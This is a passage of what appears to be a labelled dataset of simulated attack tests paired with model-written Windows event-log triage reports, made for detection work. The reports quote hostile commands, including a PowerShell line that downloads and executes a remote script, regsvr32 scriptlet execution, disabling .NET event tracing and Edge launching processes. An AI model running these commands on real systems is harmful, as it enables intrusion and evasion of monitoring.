1. **Privileges &mdash; admin_test user:**
   - Event logs confirm high-level privileges assigned to `admin_test`, inclusive of `SeDebugPrivilege` privilege. This could represent a risk if this account is used with malicious intent.
   
2. **Logons &mdash; NTLM based logons:** 
   - Several NTLM logon events are visible involving the `admin_test` user account from addresses translating to a local network. No direct malicious implications can be inferred, but NTLM can sometimes be subject to credential relay attacks.

**Application Log**

- Routine messages such as ""Service stopped"" and software protection notifications do not indicate anomalous behavior.

**Conclusion and Resolution**

**Findings:**

- The usage of `rundll32` for executing commands via `vbscript` with an attempt to launch a calculator (`calc.exe`) is highly indicative of exploitative behavior, often aligned with Proof of Concept or actual targeted payload execution maneuvers.
- While log entries related to Microsoft Edge Update processes are regular, the specific command using `rundll32` demonstrates a strong indicator of compromise, suggesting malicious activity with the latter being part of potential payload execution.

Invoke HTML Application - Jscript Engine Simulating Double Click,"In analyzing the provided Windows event logs, there are several key observations that suggest potential malicious activity on the host, Server002. I'll break down the findings by the event type and explain the suspicious components:

### Sysmon Logs Analysis:
1. **PowerShell Execution:** 
   - Multiple instances of `powershell.exe` are executed by the user `SERVER002\admin_test`. While PowerShell is not inherently malicious, it is frequently leveraged by attackers due to its power and versatility, especially when seen running scripts.
   - Of particular note, the command being run is `""powershell.exe"" & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick}`. This command is suspicious because it appears to leverage the `Invoke-ATHHTMLApplication` command, which suggests execution of scripts possibly hidden or embedded in an HTML application (HTA). The usage of such scripts can indicate an attempt to bypass security controls or perform unauthorized actions.

2. **Usage of `wevtutil.exe`:**
   - The process `wevtutil.exe` is seen being executed several times. `wevtutil` is a legitimate Windows utility used to manage event logs. In this context, repeated invocations of `wevtutil` could indicate attempts to clear or tamper with event logs, but the lack of details on command-line arguments makes it harder to confirm malicious intent. Continuous monitoring of this activity would be warranted.

3. **Additional Unusual Executions:**
   - There is frequent launching of `conhost.exe`, `whoami.exe`, and `HOSTNAME.EXE`, which could be routine but when combined with other observed activity (particularly `whoami.exe` with elevated privileges), suggest potential reconnaissance or privilege checking typical in lateral movement or preparation for privilege escalation.

### Windows PowerShell Logs Analysis:
- The logs frequently show the PowerShell command starting various sessions, further confirming that PowerShell was actively being used during the time of window capturing. The previously noted PowerShell command is reiterated in these logs without additional context or justification, reinforcing its suspicious nature.

### System and Application Logs:
- **UsoClient:** The `UsoClient.exe` process run from NT AUTHORITY\SYSTEM suggests scheduled updates or tasks, which are typically benign unless hijacked.
- **Windows Updates and System Changes:** Regular Windows update activity is noted, aligning with normal system behavior. This doesn't directly suggest malicious activity without further context, but constant vigilance is recommended to identify potential abuse or anomalous update mechanisms.

### Conclusion:
Based on the detailed inspection of the logs, the execution of PowerShell with potentially malicious intentions stands out as the key indicator of possible compromise. The particular use of commands that manipulate script execution (`Invoke-ATHHTMLApplication`) in combination with other unusual process executions and elevated command checks signal suspicious activities that warrant further investigation.

### Resolution:
- **Resolution: SUSPICIOUS**
  - The logs contain activities that deviate from expected behavior (like the specific PowerShell execution command), which need further in-depth analysis. It is advisable to investigate these events further with a focus on:
    - Conducting a forensic review of file and script artifacts.
    - Monitoring for subsequent activities from the associated account and processes.
    - Implement additional logging around PowerShell and event management tools to increase visibility on potential misuse or further compromise.

Proceed with caution, escalate to a full investigation, and involve IT operations for containment and remediation if further evidence of compromise arises during continued monitoring."
Activate Windows NoClose Group Policy Feature,"From the provided logs, there are multiple events and behaviors to analyze, and I'll proceed by examining the logs across different channels:

### Security Logs
1. **EventID 4616**: This involves a change in the system time. This can be suspicious if not expected, as changing system time can be a tactic used to deceive auditing or logging. However, it may also be benign if associated with legitimate maintenance or correction of time settings.

### Sysmon Logs
1. **Execution of `wevtutil.exe` and `conhost.exe`**: These are legitimate Windows utilities. However, frequent invocation (as seen in several logs) without an apparent legitimate administrative activity might warrant further investigation.
2. **Execution of `cmd.exe` with `reg add` Command**: Executing the command `cmd.exe /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f` indicates registry modification. This can be used to apply system policies, which in a suspicious context, might be used to disable certain Explorer features such as shutting down the system. This action should be verified if it was intended.
3. **Use of `wsmprovhost.exe`**: This is the Windows Remote Management Host Process. Its presence as a parent process suggests remote management or administration. This could be routine or suspicious, depending on administrative policies.
4. **Numerous executions of Microsoft Edge Update processes**: Though frequent running of updater services might indicate legitimate update activities, lack of user context switching and brevity between executions might be unusual, though not inherently malicious.

### Application Logs
- Routine stopping of services could correlate with an installation or update sequence, reflecting logs in the Sysmon section.

### System Logs
1. **System Time Modification**: Similar to the Security logs, another occurrence of system time modification here. Multiple modifications in short intervals can be suspicious if not part of a legitimate time synchronization task.

### Assessment:
- **Time Change**: The time change event may indicate malicious intent if it was unauthorized. It can disrupt event logging and correlate events back to real-world timelines inaccurately.
- **Registry Modification**: The registry change is suspicious and needs verification, unless confirmed as part of a regular administrative task or a legitimate application change.

### Resolution:
Based on the data and analysis, my recommendation is to classify this as **SUSPICIOUS**. The cluster of events around system time changes and registry modifications without evident correlation to authorized administrative actions requires further investigation.

### Guidance:
1. **Verify Administrative Activity**: Ascertain if an admin initiated the time changes or registry edits.
2. **Contextual Inquiry**: Identify the context in which these Windows utilities and commands were executed. Check if they align with any software updates, maintenance windows, or scheduled tasks.
3. **Follow Up on the `cmd.exe` Command**: Determine if there was legitimate need altering registry policies. Examine user accounts and permissions around the timeline of these events.
4. **Enhance Monitoring for Unusual Patterns**: Increase scrutiny on process execution, especially those altering system configurations.

If further analysis confirms unauthorized activity or supports a correlation of these events suggesting a compromised host, elevate the resolution to MALICIOUS for appropriate automated and manual remediation actions."
Regsvr32 local COM scriptlet execution,"### Detailed Analysis of Logs

#### Sysmon Logs
1. **PowerShell Execution:**
   - Multiple instances of PowerShell execution were noted by the `admin_test` user. This in itself isn't necessarily suspicious, as PowerShell is commonly used for administrative tasks. However, malicious actors often use PowerShell for script-based attacks.

2. **Wevtutil and Conhost Executions:**
   - Events indicate `wevtutil.exe` and `conhost.exe` were repeatedly launched. `Wevtutil.exe` is used for managing event logs, which could indicate log tampering attempts if this is unexpected behavior. However, there’s no additional information to confirm misuse at this point.

3. **Suspicious cmd.exe and regsvr32.exe Execution:**
   - A command involving `cmd.exe` and `regsvr32.exe` seems highly suspect:
     ```
     cmd.exe /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct"" scrobj.dll
     ```
   - This command is an indication of the usage of an SCT file which could be used for proxying malicious scripts back to a remote attacker. Use of `regsvr32.exe` to execute scripts is a known technique in various malware, particularly for bypassing restrictions.

4. **Usage of Tools Like `whoami.exe`:**
   - Executions of `whoami.exe` and `hostname.exe` reflect common actions by attackers to gather basic information about compromised systems.

5. **Edge Update Activity:**
   - A series of events involve Microsoft Edge updates. These should be reviewed to confirm they were legitimate updates pushed by Microsoft. However, extensive activity related to a legitimate software update appears normal in the context presented, assuming they originate from Microsoft infrastructure.

#### Application Logs
1. **Windows Defender Status:**
   - `Windows Defender` is active as per event entries, showing protection enabled, but doesn't preclude all possible malicious activities.

#### Assessment
The key point of concern within the logs is the command with `regsvr32.exe` involving an SCT script file, as this strongly indicates potentially malicious activity aimed at executing unauthorized scripts, often employed in attacks to bypass whitelisting restrictions.

### Detection Resolution: MALICIOUS
The detected behavior of `cmd.exe` launching `regsvr32.exe` with an SCT file is an established technique used by attackers for executing malicious payloads, leading to the assessment of these logs containing malicious activity.

### Recommendations
1. **Immediate Actions:**
   - Isolate the machine to prevent further potential spread or data exfiltration.
   - Initiate a deeper forensic investigation focusing on:
     - Full content of the `RegSvr32.sct` file.
     - Any communications or connections made during this timeframe from the host.
     
2. **Long-term Measures:**
   - Review and strengthen PowerShell execution policies.
   - Ensure application whitelisting policies are enforced and reviewed.
   - Conduct user education regarding secure operating and use of privilege account access.

This case requires immediate attention to examine the full scope of any potential compromise and mitigate risks."
Command Execution with NirCmd,"In analyzing the provided logs from various sources, including Security, Windows PowerShell, Sysmon, and Application logs, we observe several key events that may indicate suspicious or potentially malicious activity on the Windows host ""Server002."" Below are observations and analyses focusing on potential indicators of compromise:

### Key Observations

1. **Security Logs:**
   - **EventID 4624 and 4672**: Multiple successful logons by the SYSTEM account with all possible privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.). While SYSTEM activity is common in Windows operations, monitoring for privilege exploitations should be considered if these events are unexpected or frequent without user action.
   - **EventID 5379**: Multiple credential validation events failed with the return code ""3221226021"", which indicates an ""Access Denied"" or failure to return expected credentials. This can be a normal activity if the system policy isn't compromised or misconfigured. However, repetitive unsuccessful credential access attempts may suggest attack vectors like password spraying or brute-force attempts.
   - **EventID 4798**: The enumeration of local accounts by applications run under the SYSTEM process. Enumeration is standard for certain legitimate OS and application functions but can also signify reconnaissance by threat actors attempting to discover account details.

2. **Windows PowerShell Logs:**
   - Logs showed PowerShell being executed to launch a command involving `nircmd.exe`, a known legitimate but powerful tool that can manipulate applications in a way that might be used for malicious purposes (e.g., hiding taskbar elements). This execution is done from a temporary directory, indicating potential script-based attack vectors or risky behavior due to its persistence typically used in stealth operations.

3. **Sysmon Logs:**
   - Multiple instances of process creation across typical Windows utilities like wevtutil.exe, conhost.exe, sc.exe, and powershell.exe, alongside nircmd.exe. The presence of wevtutil.exe and conhost.exe, typically seen in system configuration or maintenance but potentially indicating steps in log deletion, system information extraction by attackers.
   - Execution of `nircmd.exe` tied to `cmd.exe` executing scripts from temporary directories. This suggests script-based execution which is often leveraged in attacks for reconnaissance or changes to system appearance.

4. **Application Logs:**
   - Observance of routine Edge browser updates, which are not generally suspicious in isolation, need correlation if used by adversaries to masquerade actions as legitimate software updates.

### Assessment

- **Suspicious Activity**: The usage of `nircmd.exe` in conjunction with PowerShell to alter desktop appearance (hiding Windows taskbar elements) is generally uncommon in benign environments unless used for troubleshooting. Combined with the unsuccessful credential accesses and process executions from temp directories, these factors suggest potential preparation or execution of stealth tactics.
- **Additional Indicators**:
  - Launching of PowerShell scripts or commands from `AppData` or `Temp` directories, unconventional for typical legitimate scripts/products.
  - Multiple privilege escalation attempts through SYSTEM user activities, especially if these privilege IDs are unexpected on the system.

### Conclusion
Based on the logs analyzed, the presence of potential unauthorized usage of tools and observed activities lack a clear explanation in regular system operations. Combined with suspicious elements around credential attempts and desktop manipulation, this leads to the conclusion:

- **Resolution: SUSPICIOUS**

### Recommendations

1. **Further Investigation and Monitoring:**
   - Validate whether the PowerShell commands and `nircmd.exe` usage align with any known administrative activities or if they represent unauthorized changes or persistent threats.
   - Review historical and contextual logs for patterns showing repeated login failures or process executions to draw connections with abnormal activities.
   - Consider employing further detection measures such as opening and closing known pathways or entries, monitoring temp directories for script execution.

2. **User Education and System Hardening:**
   - Educate users about risks associated with running low-trust applications or scripts from temporary or unconventional paths.
   - Enforce stricter policies or alerting on high-risk PowerShell commands across user sessions."
DiskShadow Command Execution,"Based on the provided Windows event logs, I have analyzed the entries and identified some behaviors that could be considered suspicious. Here is the detailed analysis of the relevant logs:

### Key Observations:

1. **PowerShell Execution:**
   - **EventID 1 & 400 in Sysmon logs:** The logs indicate the execution of `powershell.exe` with command-line arguments that involve using `diskshadow.exe` to execute a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.txt`. 
   - **Windows PowerShell logs:** These logs confirm the PowerShell activity, with `diskshadow.exe` being executed via PowerShell, potentially to perform shadow copy operations or modify disk snapshots, which is an unusual operation often used for persistence or data exfiltration.

2. **Wevtutil and conhost Execution:**
   - There are multiple entries for the execution of `wevtutil.exe` and `conhost.exe`. While `conhost.exe` is a legitimate Windows process for the console window host, the frequent appearance of `wevtutil.exe`, which is used to manage event logs, could indicate attempts to clear or manipulate logs, which is suspicious behavior.

3. **Process Executions:**
   - The frequent and tightly-timed execution of processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` seems unusual and could suggest automated scripts or malicious activity.

4. **Usage of Service and Network Service Accounts:**
   - Various processes are being executed under service accounts like `NT AUTHORITY\NETWORK SERVICE` and `NT AUTHORITY\SYSTEM`, which highlight potential privilege escalation activities or abuses of service contexts.

5. **Edge Update Activity:**
   - Numerous events are related to `MicrosoftEdgeUpdate.exe`. While update processes are typical, the frequency and variety of command-line arguments might warrant further investigation to ensure they are legitimate updates and not masquerading activities.

### Assessment:

- **Suspicious Activity:** The use of PowerShell to execute `diskshadow.exe` is particularly concerning as it might be used for backup operations but could also be leveraged for malicious intent, like hiding malicious payloads using VSS (Volume Shadow Copy Service). Additionally, the use of `wevtutil.exe` suggests attempts to interact with event logs, which is a common tactic to cover tracks.

- **Benign Activity:** The execution of Microsoft Edge Update components appears somewhat normal but due to the numerous entries, it should be verified as legitimate by cross-referencing with expected update schedules.

### Guidance:

- **Further Investigation:** Given the unusual command-line execution via PowerShell and usage of `wevtutil.exe`, investigate and verify if these actions are part of known scripts or procedures. Check for user confirmation or scheduled tasks that may justify these actions.

- **Log Analysis:** Investigate if there have been any attempts to clear logs or disable logging functionalities, especially around the time when `wevtutil.exe` was executed.

- **Review Access and Permissions:** Confirm that no unauthorized changes were made to various critical services, and examine if any unexpected new accounts or privilege escalations occurred during this timeframe.

### Final Resolution: **SUSPICIOUS**

The activity observed in the logs suggests features of suspicious activity that need in-depth investigation to rule out potential malicious actions, focusing on the PowerShell execution involving `diskshadow.exe` and the extensive `wevtutil.exe` activity."
Rundll32 advpack.dll Execution,"### Detailed Analysis and Assessment:

#### Suspicious Behavior:
1. **PowerShell Execution:**
   - The log entry shows a process execution of `powershell.exe` by the user `SERVER002\\admin_test`. PowerShell is a powerful shell environment on Windows systems often used by administrators, but it is also commonly exploited by attackers for executing scripts and commands stealthily. However, without a detailed command line, it is difficult to determine if this particular instance is malicious.

2. **Use of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe` execution by `SERVER002\\admin_test`. `wevtutil.exe` is a command-line utility used for managing Event Logs on Windows, which includes capabilities to clear logs. Frequent and unexplained usage can be a red flag as attackers sometimes clear logs to cover their tracks.

3. **Unusual Command Execution by `cmd.exe`:**
   - The logs show `cmd.exe` executing with a command line referencing `rundll32.exe` with various parameters in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.011\\src\\data.011.inf`). 
   - The use of `rundll32.exe` to execute an INF file via `advpack.dll,LaunchINFSection` is unusual and potentially malicious. It could be indicative of an attempt to execute non-standard, potentially harmful instructions.

4. **System User Privileges:**
   - The log includes entries for `Security-Auditing` events (Event ID `4672`) where the `SYSTEM` user, a powerful administrative account, was granted a series of elevated privileges. While this is typical for some system operations, it’s also noteworthy if correlated with suspicious activities.

5. **Logon Activity:**
   - Event ID `4624` is a successful logon event for the `SYSTEM` account, which is common for internal processes. However, the mapping between this ID and other suspicious activities might suggest more detailed investigation into user actions during this period.

#### Signs of Potential Compromise:

1. **Presence of `rundll32.exe` and `advpack.dll`:**
   - The execution pathway through `rundll32.exe` with the `advpack.dll` to trigger an INF-based process is a known technique used in various forms of exploitation or unauthorized setup installations which can signal compromise.
  
2. **Multiple Unrelated System Utilities:**
   - Short succession execution of PowerShell, `wevtutil.exe`, and other utilities (e.g., `whoami.exe`, `HOSTNAME.EXE`, `dllhost.exe`), particularly by the same user or process group, could indicate scripting operations or exploitation chains—potentially automated tooling or manual attacker activity.

3. **Activity in Temporary Folders:**
   - The temporary folder activity and repeated referencing in command execution lines denote possibly transient files being used in exploits or installation vectors as attackers often place tools or payloads here due to its writable nature.

#### Conclusion:

Based on the review of logs indicating obscure and potentially harmful execution patterns, the analysis concludes with a resolution of **MALICIOUS**. The combination of suspicious PowerShell execution, INF file manipulation via `rundll32.exe`, and inconsistent process activities suggest a high risk of compromise or ongoing malicious activity.

#### Recommended Actions:
- **Immediate Investigation:**
  - Review command-line arguments for `powershell.exe` and `cmd.exe` to replicate and understand the actions performed.
  - Investigate the contents and purpose of the `data.011.inf` file and any associated `src` directory content.

- **Enhanced Monitoring:**
  - Increase monitoring and logging practices on `SERVER002` for further anomalous behavior, especially around the specific processes identified.
  
- **System Audit and Cleanup:**
  - Conduct a full audit of the user accounts and their privileges to ensure no unauthorized access or persistence mechanisms have been established.
  - Inspect temporary directories for suspicious files that may have been left by the observed activity.

- **User Education and Policy Review:**
  - Educate users, especially those with administrative privileges, about the risks of executing scripts and commands without validation.
  - Review policy around script execution and administrative tool usage to tighten possible exploitation vectors. 

Proceed with the recommended measures to mitigate the identified risks and further secure the environment against potential threats."
Safe Mode Boot,"Upon reviewing the Windows event logs, the following key observations were made:

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`**: We see multiple executions of `wevtutil.exe`, a utility that can be used to query and manage event logs. Each execution is paired with a `conhost.exe` instance. The repeated invocation without explicit commands in these logs could suggest potential manipulation of event logs, which is a known technique attackers use to cover tracks.

2. **Execution of `cmd.exe` with Suspicious Command**: On a particular event, there is an execution of `cmd.exe` with the command `bcdedit /set safeboot network`. This command modifies the boot configuration data to enable Safe Mode with networking. This action can be part of a persistence mechanism or for isolating the environment for further malicious actions.

3. **Use of `bcdedit.exe` Alone is Anomalous**: The execution of `bcdedit.exe` by `cmd.exe` is not common in regular user operations, suggesting administrator intents, especially given the context provided by the command to modify startup settings.

4. **`whoami.exe` Execution**: The usage of `whoami.exe` immediately after other suspicious activities often relates to user enumeration, indicating someone is checking the privileges of their access, which, although a benign system command, is telling given the surrounding context.

5. **Integrity Level and User Account**: All processes are running with high integrity levels under the account `SERVER002\\admin_test`, indicating administrative permissions, which increases the risk level and potential impact of any malicious activity being successful.

6. **Time Change Events**: There are records in the system log showing changes in the system time. This might be benign but can also suggest attempts to manipulate timestamps for further obfuscation in log records.

### Assessment and Conclusion:
The combination of these activities suggests a pattern that aligns with known compromise tactics, including log manipulation (using `wevtutil.exe`), persistence setup (using `bcdedit /set safeboot network`), and privilege confirmation (via `whoami.exe`). These indicate a potential compromise and suggest that steps are being taken to establish persistent, potentially obfuscated control over the system.

### Resolution:
Given the activities observed and the context of these commands which align with potential malicious objectives, the situation warrants classification as:

- **MALICIOUS**

### Recommendations:
- **Immediate Investigation**: Conduct a thorough investigation of the machine to assess the extent of the breach.
- **Containment**: Isolate the affected system to prevent lateral movement.
- **Log and System Audit**: Review all logs and system settings for additional indicators of compromise.
- **Security Controls Review**: Evaluate EDR and other security mechanisms that should have detected or blocked these actions sooner.
- **Forensic Analysis**: Consider a deeper forensic analysis to understand attacker motives and methodologies and to uncover any additional persistence mechanisms or malware.
- **Report Findings**: Document the findings and report to appropriate internal and possibly external bodies if sensitive data may be at risk."
InstallUtil Uninstall method call - -U variant,"Based on the analysis of the provided logs, several factors point towards potentially malicious behavior:

1. **PowerShell Execution of Scripts with Administrator Privileges**: The logs indicate that several PowerShell scripts were executed using a path located in `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1`. The use of temporary directories for script execution is a common method employed by attackers to execute payloads without leaving significant traces on the system.

2. **Compilation and Execution of Assemblies**: Multiple entries show activities involving Microsoft .NET assemblies (`csc.exe`, `cvtres.exe`, and `InstallUtil.exe`). These tools are typically used to compile and run .NET applications and can be weaponized for malicious purposes, especially when used with InstallUtil to execute malicious assemblies disguised as legitimate programs.

3. **Execution of InstallUtil with Suspicious Parameters**: InstallUtil was executed with a potentially harmful DLL `data.004.dll`. The command-line arguments suggest that it was used to log or obfuscate its execution, a technique often used to avoid detection (`/logfile= /logtoconsole=false`).

4. **Elevated Integrity Level**: Processes were executing at a high integrity level, implying administrative privileges, which are not typically necessary for routine tasks. This is another potential indicator for privilege escalation attempts.

5. **Presence of .NET Framework Compiler Calls**: The use of `csc.exe` and associated files in the AppData directory implies an attempt to compile code on-the-fly, a tactic often used by malware to download and execute payloads dynamically.

6. **Sysmon Logs**: PowerShell and .NET executables had consistent user execution tracing back to a user account `SERVER002\\admin_test`, suggesting that potential lateral movement or privilege misuse occurred, leveraging administrative credentials.

**Assessment**: The combination of these factors strongly suggests that the observed behavior is consistent with a .NET-based attack or post-exploitation activity. The execution of scripts and binaries from non-standard directories, especially within temporary paths, alongside the use of InstallUtil to potentially execute malicious DLLs, is a significant indicator of malicious activity.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately isolate the affected system (Server002) from the network to prevent further propagation of any malicious activities.
- Conduct a thorough forensic investigation to identify any additional compromised accounts or systems in the network.
- Review and possibly revoke any administrative privileges that have been misused.
- Implement monitoring rules to detect further abuse of PowerShell, InstallUtil, and .NET compiler executions, focusing on unusual directories and temporary paths.
- Consider a comprehensive review of security policies around the use of script execution and temporary space to prevent a recurrence of similar incidents."
Ursnif Malware Registry Key Creation,"**Analysis of Logs**

Upon reviewing the provided logs, there are several key points and patterns that emerge:

1. **Time Synchronization Events:**
   - Multiple entries in both the System and Security logs indicate the synchronization of system time. Events from `Microsoft-Windows-Kernel-General` (Event ID 24 and 1) and `Microsoft-Windows-Security-Auditing` (Event ID 4616) show changes to the system time.
   - Time synchronization activities, typically initiated by svchost.exe as seen in these logs, are generally benign when consistent with system behavior, indicating synchronization with known time sources like `time.windows.com`.

2. **Processes Run by `admin_test`:**
   - The Sysmon logs reveal numerous processes executed by the user `SERVER002\admin_test`. These include common administrative tools such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and notably `cmd.exe` with `reg.exe`.
   - The use of `wevtutil.exe` and console-related executables like `conhost.exe` might seem routine for administrative maintenance but could also indicate scripting or command execution potentially related to monitoring or diagnostics.

3. **Suspicious Registry Modification:**
   - The command executed by `cmd.exe` uses `reg.exe` to modify a registry key, specifically under `HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4`. The context of this registry modification is unusual: `reg add` commands are typically scrutinized, especially when they involve binary data manipulation.
   - The modification is performed under a path in `AppDataLow`, which may signify attempts by a less-privileged or sandboxed process, though isn't inherently malicious.

4. **Integrity Level and Process Chains:**
   - Entries for processes such as `cmd.exe` and `reg.exe` indicate running at a High Integrity Level, typical for processes executed with elevated privileges, affirming they might have been run within an administrative context.
   - `Parent-Child` relationships of processes show legitimate parent processes (`wsmprovhost.exe`) typically associated with remote management or services.

5. **Lack of Known Malicious Indicators:**
   - There are no clear indicators of known malware behavior such as rogue process images, foreign digital signatures, or external communication attempts in the logs provided.
   - No PowerShell or Application logs were provided that could offer insight into scripting actions often indicative of lateral movement or exploitation.

**Assessment and Resolution:**

The presence of time synchronization and administrative process logs are expected in server environments. However, the registry modification executed by `cmd.exe` and `reg.exe`, especially with binary data and obscure registry paths, stands out as requiring more context to determine intent and legitimacy.

- **Resolution:** **SUSPICIOUS**

**Guidance:**
1. **Further Investigation:** 
   - Examine the context and legitimacy of the registry key modification. Consider verifying the purpose of `3A861D62-51E0-15700F2219A4` with administrators.
   - Review other logs for failed attempts or context around the time of the registry modification.
   
2. **Environmental Review:**
   - Consider scanning for further anomalies in event logs that might tie to lateral activity.
   - Check for similar command execution patterns across different users or machines in the network.

3. **Consultation with IT/Sysadmin:**
   - Discuss these events with the IT department to understand potentially normal administrative scripts or maintenance that could account for these log entries.

The assessment remains cautious but does not definitively point to active malicious activity without further corroborative evidence."
WinPwn - UAC Bypass ccmstp technique,"## Detailed Analysis

**PowerShell Logs:**

The PowerShell logs indicate a potentially malicious activity. The use of `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')` suggests the download and execution of a remote script. The execution of scripts directly from the internet, especially from a personal GitHub repository, is a common red flag for suspicious or malicious activity. Furthermore, the use of `-noninteractive` and the execution of `calc.exe` as part of the command implies potential testing or a proof of concept for execution, which may not be inherently malicious by itself but suggests improper or unauthorized script execution.

**System Logs:**

The system logs primarily show kernel and time adjustment events, with standard svchost.exe process activity. There is a time synchronization event indicating a change in system time, but nothing overtly suspicious is visible based on these logs alone.

**Application Logs:**

The application logs show Windows Defender is active and some regular activities, such as the Microsoft Edge update service activities. There is no indication of blocking or detection of threats by Windows Defender based on these logs. The Edge update-related activities seem benign and routine.

**Sysmon Logs:**

Sysmon logs provide detailed information about processes. The main point of concern is the execution of PowerShell with external script downloading (as seen in the previously analyzed PowerShell log). This was executed by a user named `admin_test`. High integrity level is noted, which suggests elevated privileges or administration-level execution, raising concern when paired with unsolicited internet connections.

**Security Logs:**

The security log entries included indicate time change events orchestrated by svchost.exe from the LOCAL SERVICE account, which corresponds with time synchronization and does not appear suspicious in itself.

## Assessment

- **Suspicious Behavior:** The execution of a PowerShell script from an external URL is highly concerning and indicative of potential malicious activity or unauthorized testing on the system. The common obfuscation method and the use of `iex` to execute the script remotely are classic indicators often observed in malicious PowerShell activities.
- **Edge Updates and other Process Logs:** Regular activities related to system updates and Edge updates appear mostly benign and align with typical system tasks and background maintenance.

## Resolution

**Final Decision: SUSPICIOUS**

This resolution is based on the evidence of unapproved script downloads and executions using PowerShell from remote repositories, which requires immediate further investigation to ensure there is no active compromise or unauthorized activities.

## Guidance

1. **Containment and Investigation:**
   - Isolate the user account `admin_test` to prevent further potential misuse or damage.
   - Investigate the internet activity and script content from the URL to understand its purpose and possible threat level.
   - Collect and review additional logs and network activity during the timeframe of the event.

2. **Detection and Prevention:**
   - Implement and review EDR rules to detect and prevent unauthorized PowerShell execution, especially those involving external content.
   - Conduct a security audit for unauthorized users and system activities.  
   
3. **Remediation:**
   - If malicious intent or compromise is confirmed, ensure a thorough cleanup by removing any unauthorized scripts, tools, or backdoors.
   - Update and ensure that all systems and security protocols are in place and adhered to bolster system integrity."
Disable .NET Event Tracing for Windows Via Registry (powershell),"In this analysis, we aim to identify any potential malicious activity or compromise indicators in the provided Windows event logs. 

### Analysis of Windows Event Logs:

#### Windows PowerShell Log:

- **PowerShell Command Execution**:
  - Command executed: `powershell.exe & {New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force}`
  - **Concern**: This command disables the Event Tracing for Windows (ETW) for the .NET Framework, which can be utilized by attackers to evade detection.

#### System Log:

- **Kernel-General Events (Event ID 1)**:
  - Time jumps observed in some entries.
  - **Concern**: Time adjustments are frequent but can be suspicious if done purposefully to alter logs or evade detections.

#### Sysmon Log:

- **Process Creation and Execution**:
  - Multiple executions by `SERVER002\admin_test` and SYSTEM accounts involved common utilities (`wevtutil.exe`, `conhost.exe`, `powershell.exe`, `whoami.exe`).
  - **Concern**: Repeated execution of `wevtutil.exe` might indicate log manipulation or clearing activities.

- **PowerShell Execution (Event ID 1 & 5)**:
  - PowerShell was used in a similar fashion as is observed in PowerShell logs. This indicates activity possibly aimed at disabling ETW for stealth.

#### Security Log:

- Contains changes to system time. As described in the System log section, specific attention should be given to ensure these activities were authorized.

#### Application Log:

- **Security SPP Event**:
  - Routine event related to the Windows Software Protection Platform Service.
  - **Concern**: None directly, but correlating with the system timestamp change could be reviewed for any indirect implications.

### Assessment and Conclusion:

Based on the analysis of the logs:

- **Indicators of Compromise**:
  - Usage of PowerShell to disable ETW indicating possible evasion attempts.
  - Frequent usage of process utilities (`wevtutil.exe` and others) by `admin_test` with sensitive capabilities.
  - Consistent execution under a privileged user adds suspicion.

- **Risks Identified**:
  - Potential tampering or disabling of security and auditing tools to obscure malicious actions.
  - Possible misuse of elevated privileges, indicating the system may be compromised.

### Resolution: **SUSPICIOUS**

Given the suspicious PowerShell commands attempting to disable security event tracking, alongside potential log manipulation and time tampering, these activities merit further investigation. Review administrative actions, user motives, and potential external indicators or alerts to rule out intrusion or insider threats.

### Recommendations:

1. **Immediate Investigation**: Conduct a deeper investigation into the command executed by PowerShell and the context of the process executions, specifically around `wevtutil.exe`.
2. **Log and Time Auditing**: Validate the legitimacy of the time changes and any correlated log modifications.
3. **User Privileges Review**: Assess the necessity of privileges granted to `admin_test` and verify recent activities.
4. **Security Hardening**: Implement stricter monitoring policies on PowerShell and administrative tool usage.

Additionally, deploying endpoint security measures and employing threat intelligence feeds can assist in timely detection and response to similar suspicious activities."
LOLBAS Msedge to Spawn Process,"Upon analyzing the provided Windows event logs, several indicators suggest suspicious, if not outright malicious, activity.

### Indicators of Suspicion

1. **PowerShell Execution with Suspicious Command**:
   - A PowerShell script was executed with a command that attempts to set the `$edgePath` variable to the path of Microsoft Edge, and if it exists, it utilizes Edge to launch the Windows Calculator (`calc.exe`) using the `--gpu-launcher` argument. This is immediately followed by commands to kill the `msedge.exe`, `calc.exe`, and `win32calc.exe` processes. This usage of PowerShell and abusing a legitimate application like Edge via command line arguments to launch other processes is highly suspicious and often associated with malicious behavior.
   
2. **Use of Taskkill to Terminate Processes**:
   - The script includes the use of `taskkill` to forcibly terminate the Microsoft Edge and Calculator processes. This could be an attempt to cover tracks or ensure that the malicious processes are not left running, further indicating potentially malicious intent.

3. **Abuse of Legitimate Software**:
   - The launching of `calc.exe` through Edge's `--gpu-launcher` parameter is an abuse of that functionality, typically seen in scenarios where an attacker is attempting to perform privilege escalation or maintain persistence by executing additional commands or applications in the context of a more trusted process.

4. **Frequent Spawning of Process by Edge**:
   - There is a high frequency of Microsoft Edge processes being spawned along with the Calculator, suggesting an automated or scripted activity rather than a legitimate manual operation by a user.

### Assessment and Risks

The activities discussed above are out of the norm for legitimate use of Microsoft Edge and PowerShell and align with known tactics used by attackers to execute and hide malicious software. The behavior seems to focus on exploiting Edge's features to execute other commands, possibly leveraging Edge’s trusted status to perform unauthorized actions under a legitimate facade.

### Guidance on How to Proceed

1. **Classify this Activity**: Given the clear indicators of suspicious behavior, this should be classified as **MALICIOUS**. The methods used are strongly indicative of an attempt to execute unauthorized processes with potential malicious intent.
   
2. **Immediate Action**: 
